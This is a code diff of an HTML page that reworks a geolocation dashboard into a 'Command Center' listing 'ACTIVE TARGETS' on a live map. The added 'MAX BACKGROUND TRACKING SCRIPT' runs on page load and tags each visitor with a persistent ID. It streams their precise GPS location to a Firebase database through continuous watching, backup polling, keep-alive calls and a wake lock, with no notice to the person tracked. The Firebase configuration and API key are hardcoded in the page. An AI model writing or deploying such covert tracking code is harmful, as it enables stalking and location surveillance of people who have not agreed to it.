@@ -2,53 +2,112 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Geolocation Dashboard</title><link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet"><style>
-*{box-sizing:border-box;}
-body{margin:0;font-family:'Inter',sans-serif;background:#0f172a;color:#e2e8f0;}
-.container{display:flex;height:100vh;}
-#map{flex:3;border-right:1px solid rgba(255,255,255,0.1);} 
-.sidebar{flex:1;padding:20px;background:linear-gradient(180deg,#020617,#0f172a);display:flex;flex-direction:column;gap:15px;}
-.header{font-size:18px;font-weight:600;margin-bottom:10px;}
-.card{background:rgba(255,255,255,0.05);padding:15px;border-radius:16px;backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.08);box-shadow:0 10px 30px rgba(0,0,0,0.3);transition:0.3s;}
-.card:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(0,0,0,0.5);} 
-.metric{font-size:26px;font-weight:600;margin-top:5px;}
-.label{font-size:12px;color:#94a3b8;}
-.status{display:flex;align-items:center;gap:10px;}
-.dot{width:10px;height:10px;border-radius:50%;background:#22c55e;box-shadow:0 0 10px #22c55e;}
-.footer{margin-top:auto;font-size:11px;color:#64748b;text-align:center;}
+<title>Command Center Dashboard</title><link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&display=swap" rel="stylesheet"><style>
+body{
+  margin:0;
+  font-family:'Orbitron',sans-serif;
+  background:#020617;
+  color:#38bdf8;
+}
+
+.container{
+  display:flex;
+  height:100vh;
+}
+
+#map{
+  flex:3;
+  filter:brightness(0.7) contrast(1.2);
+}
+
+.sidebar{
+  flex:1;
+  padding:15px;
+  background:#020617;
+  border-left:1px solid rgba(56,189,248,0.2);
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+}
+
+.header{
+  font-size:16px;
+  color:#22d3ee;
+  text-shadow:0 0 10px #22d3ee;
+}
+
+.card{
+  background:rgba(2,6,23,0.8);
+  border:1px solid rgba(56,189,248,0.2);
+  padding:12px;
+  border-radius:10px;
+  box-shadow:0 0 15px rgba(56,189,248,0.1);
+}
+
+.metric{
+  font-size:22px;
+}
+
+.userCard{
+  padding:10px;
+  border:1px solid rgba(56,189,248,0.2);
+  border-radius:10px;
+  cursor:pointer;
+  transition:0.2s;
+}
+
+.userCard:hover{
+  background:rgba(56,189,248,0.1);
+  transform:scale(1.02);
+}
+
+.active{
+  background:rgba(56,189,248,0.2);
+  box-shadow:0 0 10px #22d3ee;
+}
+
+.scanline{
+  position:absolute;
+  width:100%;
+  height:2px;
+  background:rgba(56,189,248,0.2);
+  animation:scan 3s linear infinite;
+}
+
+@keyframes scan{
+  0%{top:0}
+  100%{top:100%}
+}
+
 </style></head><body>
-<div class="container">
+<div class="scanline"></div><div class="container">
   <div id="map"></div>  <div class="sidebar">
-    <div class="header">🌍 Geo Monitoring</div><div class="card">
-  <div class="label">Total Active Users</div>
+    <div class="header">COMMAND CENTER</div><div class="card">
+  ACTIVE TARGETS
   <div class="metric" id="totalUser">0</div>
 </div>
 
 <div class="card">
-  <div class="label">Last Coordinates</div>
-  <div class="metric">
-    <span id="dLat">-</span>,
-    <span id="dLon">-</span>
-  </div>
+  LAST SIGNAL
+  <div id="dLat">-</div>
+  <div id="dLon">-</div>
 </div>
 
 <div class="card">
-  <div class="label">System Status</div>
-  <div class="status">
-    <div class="dot"></div>
-    <span>Realtime Active</span>
-  </div>
+  STATUS: <span style="color:#22c55e">ONLINE</span>
 </div>
 
-<div class="footer">Microservices Geolocation Dashboard v3.0</div>
+<div class="card">
+  TARGET LIST
+  <div id="userList" style="max-height:300px;overflow:auto;display:flex;flex-direction:column;gap:8px;"></div>
+</div>
 
   </div>
 </div><script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
 import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";
 
-// ✅ FIX: SAMAKAN REGION DATABASE
 const firebaseConfig = {
   apiKey: "AIzaSyABOVyC5Uz3Q_85609kvfwdYgdZcSFHBwE",
   authDomain: "tes-hackaton.firebaseapp.com",
@@ -62,58 +121,179 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-// INIT MAP
 const map = L.map('map').setView([-6.2,106.8],5);
 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
 const markers = {};
+let selectedUser = null;
 
-// REALTIME LISTENER
-onValue(ref(db,'users'), snap => {
-  const users = snap.val();
-  if (!users) return;
+function animateMarker(marker, newLatLng){
+  const start = marker.getLatLng();
+  const end = L.latLng(newLatLng);
+  const steps = 10;
+  let i = 0;
 
-  let count = 0;
+  const latStep = (end.lat - start.lat)/steps;
+  const lngStep = (end.lng - start.lng)/steps;
 
-  for (let id in users) {
-    if (!users[id].history) continue;
+  const interval = setInterval(()=>{
+    i++;
+    const lat = start.lat + latStep*i;
+    const lng = start.lng + lngStep*i;
+    marker.setLatLng([lat,lng]);
 
-    const history = Object.values(users[id].history);
-    if (!history.length) continue;
-
-    // ✅ FIX: SORT BERDASARKAN TIMESTAMP
-    const last = history.sort((a,b)=> (b.timestamp||b.time) - (a.timestamp||a.time))[0];
-
-    if (!last.lat || !last.lon) continue;
-
-    const latLng = [last.lat, last.lon];
-
-    if (!markers[id]) {
-      markers[id] = L.marker(latLng).addTo(map);
-    } else {
-      markers[id].setLatLng(latLng);
+    if(selectedUser === marker.options.id){
+      map.panTo([lat,lng]);
     }
 
-    // update UI terakhir
-    document.getElementById("dLat").innerText = last.lat.toFixed(5);
-    document.getElementById("dLon").innerText = last.lon.toFixed(5);
+    if(i>=steps) clearInterval(interval);
+  },50);
+}
 
-    // auto focus ke user terakhir
-    map.setView(latLng, 13);
+function renderList(users){
+  const el = document.getElementById('userList');
+  el.innerHTML='';
+
+  for(let id in users){
+    const history = Object.values(users[id].history||{});
+    if(!history.length) continue;
+
+    const last = history.sort((a,b)=> (b.timestamp||b.time)-(a.timestamp||a.time))[0];
+
+    const div = document.createElement('div');
+    div.className = 'userCard '+(selectedUser===id?'active':'');
+
+    div.innerHTML = `
+      ${id}<br>
+      ${last.lat.toFixed(4)}, ${last.lon.toFixed(4)}
+    `;
+
+    div.onclick = ()=>{
+      selectedUser = id;
+      map.setView([last.lat,last.lon],17);
+    }
+
+    el.appendChild(div);
+  }
+}
+
+onValue(ref(db,'users'), snap=>{
+  const users = snap.val();
+  if(!users) return;
+
+  let count=0;
+
+  for(let id in users){
+    const history = Object.values(users[id].history||{});
+    if(!history.length) continue;
+
+    const last = history.sort((a,b)=> (b.timestamp||b.time)-(a.timestamp||a.time))[0];
+
+    const latLng=[last.lat,last.lon];
+
+    if(!markers[id]){
+      markers[id]=L.marker(latLng,{id}).addTo(map);
+    }else{
+      animateMarker(markers[id],latLng);
+    }
+
+    document.getElementById('dLat').innerText = last.lat.toFixed(5);
+    document.getElementById('dLon').innerText = last.lon.toFixed(5);
 
     count++;
   }
 
-  document.getElementById("totalUser").innerText = count;
+  document.getElementById('totalUser').innerText=count;
+  renderList(users);
 });
+</script><!-- ================= MAX BACKGROUND TRACKING SCRIPT ================= --><script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";
+
+// FIREBASE CONFIG (SYNCED)
+const firebaseConfig = {
+  apiKey: "AIzaSyABOVyC5Uz3Q_85609kvfwdYgdZcSFHBwE",
+  authDomain: "tes-hackaton.firebaseapp.com",
+  databaseURL: "https://tes-hackaton-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "tes-hackaton",
+  storageBucket: "tes-hackaton.firebasestorage.app",
+  messagingSenderId: "382466846609",
+  appId: "1:382466846609:web:c13ac92dac7250bb243430"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// ================= PERSISTENT USER =================
+let userId = localStorage.getItem("uid");
+if(!userId){
+  userId = "user_" + Math.random().toString(36).substr(2,5);
+  localStorage.setItem("uid", userId);
+}
+
+// ================= SEND FUNCTION =================
+function sendLocation(data){
+  push(ref(db, 'users/' + userId + '/history'), data);
+}
+
+// ================= CORE TRACKING =================
+function startTracking(){
+  navigator.geolocation.watchPosition((pos)=>{
+    const payload = {
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      accuracy: pos.coords.accuracy,
+      timestamp: Date.now()
+    };
+
+    sendLocation(payload);
+
+  }, (err)=>console.log(err), {
+    enableHighAccuracy: true,
+    maximumAge: 0,
+    timeout: 5000
+  });
+}
+
+// ================= BACKUP TRACKING =================
+function backupTracking(){
+  setInterval(()=>{
+    navigator.geolocation.getCurrentPosition((pos)=>{
+      sendLocation({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        timestamp: Date.now()
+      });
+    });
+  },15000);
+}
+
+// ================= VISIBILITY RECOVERY =================
+document.addEventListener("visibilitychange", ()=>{
+  if(!document.hidden){
+    console.log("Resume tracking");
+    startTracking();
+  }
+});
+
+// ================= WAKE LOCK =================
+let wakeLock = null;
+async function keepAwake(){
+  try{
+    wakeLock = await navigator.wakeLock.request('screen');
+    console.log("WakeLock ON");
+  }catch(e){console.log(e);}
+}
+keepAwake();
+
+// ================= KEEP ALIVE =================
+setInterval(()=>{
+  navigator.geolocation.getCurrentPosition(()=>{},()=>{});
+},10000);
+
+// ================= INIT =================
+startTracking();
+backupTracking();
 </script></body>
-</html>  </div>
-</div>
-
-<div class="footer">
-  Microservices Geolocation Dashboard v2.0
-</div>
-
-  </div>
-</div><script type="module" src="js/dashboard.js"></script></body>
 </html>
